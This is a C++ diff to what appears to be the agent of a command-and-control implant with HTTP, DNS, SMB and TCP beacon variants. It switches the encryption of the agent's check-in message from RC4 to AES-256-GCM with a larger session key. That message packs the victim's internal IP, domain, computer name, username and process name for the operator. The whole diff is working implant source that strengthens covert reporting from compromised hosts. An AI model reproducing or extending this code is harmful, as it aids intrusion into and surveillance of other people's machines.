@@ -26,8 +26,8 @@ Agent::Agent()
 	proxyfire   = new Proxyfire();
 	pivotter    = new Pivotter();
 
-	SessionKey = (PBYTE) MemAllocLocal(16);
-	for (int i = 0; i < 16; i++)
+	SessionKey = (PBYTE) MemAllocLocal(AES_GCM_KEY_SIZE);
+	for (int i = 0; i < AES_GCM_KEY_SIZE; i++)
 		SessionKey[i] = GenerateRandom32() % 0x100;
 }
 
@@ -100,13 +100,14 @@ BYTE* Agent::BuildBeat(ULONG* size)
 	packer->Pack8(this->info->minor_version);
 	packer->Pack32(this->info->internal_ip);
 	packer->Pack8( flag );
-	packer->PackBytes(this->SessionKey, 16);
+	packer->PackBytes(this->SessionKey, AES_GCM_KEY_SIZE);
 	packer->PackStringA(this->info->domain_name);
 	packer->PackStringA(this->info->computer_name);
 	packer->PackStringA(this->info->username);
 	packer->PackStringA(this->info->process_name);
 
-	EncryptRC4(packer->data(), packer->datasize(), this->config->encrypt_key, 16);
+	int beatEncLen;
+	unsigned char* beatEnc = EncryptAES256GCM(packer->data(), packer->datasize(), this->config->encrypt_key, &beatEncLen);
 
 	MemFreeLocal((LPVOID*)&this->info->domain_name,   StrLenA(this->info->domain_name));
 	MemFreeLocal((LPVOID*)&this->info->computer_name, StrLenA(this->info->computer_name));
@@ -115,30 +116,28 @@ BYTE* Agent::BuildBeat(ULONG* size)
 
 #if defined(BEACON_HTTP) || defined(BEACON_DNS)
 
-	ULONG beat_size = packer->datasize();
-	PBYTE beat      = packer->data();
+	ULONG beat_size = beatEncLen;
+	PBYTE beat      = beatEnc;
 
-#elif defined(BEACON_SMB) 
+#elif defined(BEACON_SMB)
 
-	ULONG beat_size = packer->datasize() + 4;
+	ULONG beat_size = beatEncLen + 4;
 	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);
 
 	memcpy(beat, &(this->config->listener_type), 4);
-	memcpy(beat+4, packer->data(), packer->datasize());
+	memcpy(beat+4, beatEnc, beatEncLen);
 
-	PBYTE pdata = packer->data();
-	MemFreeLocal((LPVOID*)&pdata, packer->datasize());
+	MemFreeLocal((LPVOID*)&beatEnc, beatEncLen);
 
-#elif defined(BEACON_TCP) 
+#elif defined(BEACON_TCP)
 
-	ULONG beat_size = packer->datasize() + 4;
+	ULONG beat_size = beatEncLen + 4;
 	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);
 
 	memcpy(beat, &(this->config->listener_type), 4);
-	memcpy(beat + 4, packer->data(), packer->datasize());
+	memcpy(beat + 4, beatEnc, beatEncLen);
 
-	PBYTE pdata = packer->data();
-	MemFreeLocal((LPVOID*)&pdata, packer->datasize());
+	MemFreeLocal((LPVOID*)&beatEnc, beatEncLen);
 
 #endif
 
